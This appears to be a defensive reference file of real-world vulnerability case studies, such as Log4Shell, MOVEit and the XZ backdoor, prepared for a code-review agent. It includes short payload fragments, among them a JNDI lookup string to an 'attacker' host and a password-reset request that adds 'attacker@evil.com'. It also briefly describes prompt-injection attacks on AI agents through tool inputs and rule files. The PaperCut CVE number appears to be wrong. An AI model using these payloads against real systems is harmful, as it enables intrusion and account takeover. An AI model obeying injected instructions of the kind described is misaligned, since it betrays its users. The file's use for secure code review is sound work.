# Case Studies — Production Vulnerabilities (2021–2026)

Real exploits with their root-cause class and the code-level lesson. The agent should pattern-match these classes proactively.

---

## Log4Shell (CVE-2021-44228, December 2021)

**Class**: Code injection via JNDI lookup in log strings.
**Vector**: `log.info(userControlledHeader)` in code using Log4j 2.0–2.16. Log4j evaluated `${jndi:ldap://attacker/}` substrings during message formatting.
**Impact**: Unauth RCE on millions of Java services.
**Fix**: Log4j ≥ 2.17.1; `log4j2.formatMsgNoLookups=true`.
**Lesson**: Format engines (logging, templating, expression-language) interpret data. Never put untrusted data into them without escaping. Detection: Log4j 2.x + any HTTP input being logged.

---

## Spring4Shell (CVE-2022-22965, March 2022)

**Class**: Mass-assignment via `class.module.classLoader.*` chain.
**Vector**: Spring MVC + JDK 9+ + Tomcat + WAR packaging; `@RequestMapping` binder accepted any-shape params, attacker rewrote Tomcat AccessLogValve to drop a JSP webshell.
**Fix**: Spring 5.3.18+/5.2.20+; `@InitBinder setDisallowedFields("class.*", "Class.*", "*.class.*")`.
**Lesson**: Mass assignment (BOPLA) in any framework that auto-binds nested object paths. Allowlist binder fields.

---

## MOVEit Transfer (CVE-2023-34362, May 2023, Cl0p ransomware)

**Class**: SQL injection in a file-transfer appliance → RCE.
**Vector**: Unauth SQLi in MOVEit's web UI; ~600 organizations breached including state agencies and enterprises.
**Fix**: Vendor patch + WAF rule + egress filter on appliance.
**Lesson**: SQLi anywhere on a network-exposed admin surface is full compromise. Network appliances need both rapid patching AND egress filtering.

---

## GitLab CVE-2023-7028 (January 2024)

**Class**: Authentication / business logic.
**Vector**: Password reset email could be sent to attacker-controlled secondary address — `email[]=victim@target.com&email[]=attacker@evil.com`. GitLab sent the reset link to **both**.
**Fix**: Validate that only a single, primary, verified email receives the reset.
**Lesson**: Never trust client-controlled email arrays in reset flows. Validate that exactly one canonical email receives security emails.

---

## Okta Support Portal (October 2023)

**Class**: Session-token theft via uploaded HAR files.
**Vector**: Customer support uploaded HAR files (browser network dumps) for debugging. HARs contain bearer tokens. Attacker stole HARs → impersonated support agents → accessed customer Okta tenants.
**Fix**: Redact tokens in HAR uploads at ingestion; MFA all admin flows; rotate sessions on any vendor incident.
**Lesson**: HARs and similar diagnostic dumps are credential-laden. Treat them as secrets in transit and at rest.

---

## XZ Backdoor (CVE-2024-3094, March 2024)

**Class**: Multi-year supply-chain implant in `liblzma` (linked into sshd via libsystemd).
**Vector**: Long-term social-engineering of the XZ project's maintainer; payload hidden in binary test fixtures, activated at build time when linked against sshd in specific distro builds.
**Fix**: Rolled-back affected versions. Industry response: SBOM + reproducible builds + scrutinize binary test fixtures.
**Lesson**: Maintainer trust = code trust. Single-maintainer critical projects are at risk. Reproducible builds + SBOM + signed releases are not optional.

---

## Polyfill.io (June 2024)

**Class**: Third-party JavaScript supply-chain hijack.
**Vector**: Polyfill.io domain sold; new owner served malicious JS to ~100,000 sites that included `<script src="https://polyfill.io/...">`.
**Fix**: Self-host polyfills; pin third-party JS via Subresource Integrity (SRI); CSP `script-src` allowlists.
**Lesson**: Every `<script src>` to a third-party domain is a remote code execution waiting to happen if that domain changes hands. SRI + self-hosting + CSP.

---

## Snowflake Account Wave (May–June 2024)

**Class**: Credential stuffing on accounts without MFA.
**Vector**: Stolen creds (info-stealers from prior years) replayed against Snowflake accounts that lacked MFA. Mass exfiltration from AT&T, Ticketmaster, and ~165 other tenants.
**Fix**: Enforce MFA at IdP; network policies on data warehouse; rotate all credentials.
**Lesson**: Cloud data warehouses are crown jewels. MFA must be enforced at the IdP level, not as a per-user setting that admins can skip.

---

## Ivanti Connect Secure (CVE-2023-46805 / 2024-21887 / 2024-21893, January 2024)

**Class**: Auth bypass + command injection chained → unauth RCE on edge VPN appliance.
**Vector**: Path traversal in the auth check, then OS command injection in a downstream API.
**Fix**: Vendor patches + integrity-monitoring + CISA emergency directive to disconnect appliances.
**Lesson**: Edge appliances need rapid patch cycles AND integrity-monitoring AND assume-breach posture. Single-CVE patches don't undo persistent attacker presence.

---

## PaperCut (CVE-2024-1212, January 2024)

**Class**: Unauth RCE on enterprise print server.
**Lesson**: Print servers and other "boring" enterprise services often have full file-system and network access. Segment them.

---

## regreSSHion (CVE-2024-6387, July 2024)

**Class**: Race condition in OpenSSH signal handler → unauth RCE.
**Vector**: Signal-handler in `sshd` invoked async-unsafe functions during a timeout race.
**Fix**: OpenSSH ≥ 9.8p1 (Linux glibc systems).
**Lesson**: Audit signal-safe code in long-lived servers. Async signal safety is its own discipline.

---

## tj-actions / reviewdog Supply Chain (CVE-2025-30066, March 2025)

**Class**: GitHub Action tag mutation leaked org secrets to logs.
**Vector**: Attacker compromised maintainer; mutated `v44` tag to point at malicious commit; downstream workflows pulled the mutated tag and ran the malicious code with org secrets in scope.
**Fix**: Pin every third-party Action by full SHA, not by tag. Org-level allowlist via OIDC and GitHub Action allowlists.
**Lesson**: Mutable tags in GitHub Actions are a supply-chain timebomb. SHA pinning is mandatory.

---

## SharePoint ToolShell (CVE-2024-38094 / 2025-53770, July 2024 / 2025)

**Class**: Deserialization of attacker-supplied ViewState via leaked MachineKey → RCE on on-prem SharePoint.
**Fix**: Rotate MachineKey post-patch; AMSI integration; isolate on-prem SharePoint from the public internet.
**Lesson**: Patching alone doesn't undo a compromised cryptographic key. Rotate after patch.

---

## Microsoft Exchange (CVE-2024-21410, February 2024)

**Class**: NTLM relay → EWS privilege escalation.
**Fix**: Disable NTLM; Extended Protection for Authentication.
**Lesson**: NTLM in 2024+ should be considered broken protocol. Migrate.

---

## CitrixBleed (CVE-2023-4966)

**Class**: Buffer over-read in NetScaler appliance → session token leak.
**Vector**: Attacker reads session tokens directly from memory; impersonates authenticated users.
**Fix**: Patch + **rotate all sessions on the appliance** (just patching doesn't kick the attacker).
**Lesson**: Memory disclosure bugs leak secrets. Patching closes the hole; doesn't expel attackers already inside.

---

## VMware vCenter (CVE-2024-37079 / 38812, June–November 2024)

**Class**: Heap overflow in DCERPC.
**Lesson**: Limit management-plane network reachability. vCenter, vSphere, ESXi management interfaces should not be on the corporate LAN.

---

## Next.js CVE-2024-34351 (April 2024)

**Class**: SSRF via Server Action redirect handling.
**Vector**: Attacker triggers a Server Action with crafted redirect target; Next.js follows server-side, exfiltrating internal service responses.
**Fix**: Update Next.js; validate redirect targets in Server Actions; do not auto-follow on server.
**Lesson**: Server Actions are a high-trust surface. Treat every Action like a public API endpoint.

---

## Next.js CVE-2025-29927 (March 2025)

**Class**: Middleware authorization bypass via `x-middleware-subrequest` header.
**Vector**: Internal Next.js header (`x-middleware-subrequest`) was trusted by middleware; attacker sends it on inbound requests, bypassing middleware-based authz.
**Fix**: Update Next.js; **never put auth solely in middleware**; strip vendor headers at the edge.
**Lesson**: Middleware is defense-in-depth. The actual authorization check belongs in the route handler / Server Action.

---

## OpenSSL ECDSA Timing (2024)

**Class**: Constant-time violation in ECDSA verification.
**Lesson**: Constant-time crypto is mandatory anywhere keys are involved. Don't write your own.

---

## LiteSpeed Cache for WordPress (2024)

**Class**: Plugin auth-bypass + privilege escalation in a popular WP plugin.
**Lesson**: WordPress plugin ecosystem is supply chain. Audit every plugin; minimize plugin count; PHP ecosystem hygiene matters.

---

## CrowdStrike Falcon Channel-File Outage (July 2024)

**Class**: Not a CVE — a configuration push to the Falcon kernel driver caused mass BSODs on Windows hosts globally.
**Lesson**: Vendor-pushed configurations need canary deployment + rollback. Critical kernel agents need test-then-deploy pipelines, not direct pushes.

---

## MCP Server / Agent CVEs (2025)

- **CVE-2025-49596** — Anthropic MCP Inspector RCE.
- **CVE-2025-32711 (EchoLeak)** — M365 Copilot zero-click prompt-injection-driven exfiltration. **See `KOLUX skills get koluxward --reference references/case-studies.md` for full coverage.**
- **CVE-2025-54135 (Cursor MCPoison)** — prompt injection escalating to RCE.

**Class**: Tool-side RCE / indirect prompt-injection-driven exfiltration.
**Lesson**: Treat tool inputs as untrusted; sandbox tool execution; egress controls on agent processes.

---

## Cursor / IDE-Agent Rule-File Injection (2025, Pillar Security)

**Class**: Indirect prompt injection via repo files (`.cursorrules`, `CLAUDE.md` with hidden Unicode payloads).
**Fix**: Don't auto-execute commands derived from repo content; sanitize zero-width / tag chars before reading config.
**Lesson**: Any file the agent reads as "instructions" is an injection surface.

---

## Common Threads

1. **Edge appliances are the front door** — Ivanti, Citrix, Fortinet, Palo Alto, MOVEit. Patch fast, segment, monitor integrity, rotate creds after every CVE.
2. **Supply chain compromises grow faster than detection** — XZ, Polyfill.io, tj-actions. Pin to SHAs, sign artifacts, SBOM, scrutinize new maintainers.
3. **Authorization beats authentication** — IDOR, BOLA, Server Action auth gaps. Ownership checks in every state-changing handler.
4. **Crypto is rotation, not just patches** — CitrixBleed, SharePoint MachineKey, CrowdStrike. Patching closes a hole; rotation expels attackers.
5. **Mutable references are a timebomb** — GitHub Action tags, Docker `:latest`, npm version ranges. Pin everything immutable.
6. **MFA must be enforced upstream** — Snowflake breach happened because per-tenant MFA was optional. IdP-level enforcement only.
7. **Memory unsafety still dominates binary CVEs** — CWE-787, CWE-125, CWE-416. Rust / managed languages where possible; sandboxing where not.
8. **AI agents are a new attack surface** — EchoLeak, MCPoison, rule-file injection. The classes are different but the discipline is the same: provenance, capability scoping, never auto-execute untrusted content.

---

## How to Use This File

When reviewing code, ask: *which of these case studies' root causes could apply here?* Pattern-match the technique class:

- Logging untrusted input in Java? → Log4Shell class.
- Mass assignment in any framework? → Spring4Shell class.
- SQL injection on an admin surface? → MOVEit class.
- Password reset accepting array of emails? → GitLab class.
- HAR uploads in support flows? → Okta class.
- Third-party `<script src>`? → Polyfill class.
- MFA optional? → Snowflake class.
- Tag-pinned GitHub Action? → tj-actions class.
- Auth check only in middleware? → Next.js CVE-2025-29927 class.
- Server Action without `await auth()`? → Server Action class.

The lessons compound. Apply them.
